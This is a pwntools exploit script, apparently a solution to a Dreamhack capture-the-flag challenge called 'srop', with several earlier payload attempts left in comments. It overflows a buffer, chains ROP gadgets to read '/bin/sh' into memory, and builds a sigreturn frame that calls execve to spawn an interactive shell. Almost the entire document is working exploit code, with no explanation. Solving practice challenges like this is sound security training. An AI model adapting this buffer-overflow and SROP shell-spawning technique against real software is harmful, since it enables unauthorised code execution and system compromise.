#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./srop',checksec=False)
context.arch = 'amd64'

# r = remote('host3.dreamhack.games',13066)
r = process(exe.path)
input()
rw_section = 0x0000000000601500
pop_rdi = 0x0000000000400583
pop_rax_syscall = 0x00000000004004eb
syscall =0x00000000004004ec 
ret = 0x00000000004003de
leave_ret = 0x0000000000400515
pop_rsi_r15 = 0x0000000000400581
# frame = SigreturnFrame()
# frame.rsp = rw_section+8
# frame.rbp = rw_section
# frame.rax= 0x0
# frame.rsi = rw_section
# frame.rdx = 0x300
# frame.rdi = 0
# frame.rip = syscall

# payload = b'A'*0x18 + p64(pop_rax_syscall)
# payload += p64(0xf) + bytes(frame)

# r.send(payload)

# frame = SigreturnFrame()
# # frame.rsp = rw_section + 8
# frame.rax= 0x3b
# frame.rsi = 0
# frame.rdx = 0
# frame.rdi = 0x0000000000601578
# frame.rip = syscall

# payload = b'/bin/sh\00' +  p64(syscall) + bytes(frame)

# r.send(payload)


frame = SigreturnFrame()
frame.rax = 0x3b
frame.rsi = 0
frame.rdi=rw_section
frame.rdx=0
# frame.rsp = syscall
frame.rip = syscall

payload = b'A'*0x18 + p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(rw_section) + p64(0)
payload += p64(exe.sym['read'])
payload += p64(pop_rax_syscall) + p64(0xf) + bytes(frame)

r.send(payload)
r.send(b'/bin/sh\00')


# payload = b'bin/sh\00'
# payload = payload.ljust(0x18,b'P')
# # payload += p64(ret)
# payload += p64(pop_rsi_r15) + p64(0) + p64(0)
# payload += p64(pop_rdi) + p64(0)
# payload += p64(pop_rax_syscall)
# payload += p64(0xf) + bytes(frame) + p64(0)



r.interactive()